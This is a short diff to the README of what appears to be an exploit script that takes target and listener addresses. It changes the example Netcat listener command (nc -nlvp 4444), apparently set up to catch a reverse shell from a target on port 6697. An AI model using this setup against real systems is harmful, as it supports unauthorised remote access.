@@ -21,7 +21,7 @@ python3 script.py <target> <tport> <listener> <lport>
 # Example
 Setup a Netcat listener on your local machine:
 ```
-nc -lp 4444
+nc -nlvp 4444
 ```
 
 Run the script against a target machine at `192.168.0.0` TCP port `6697`:
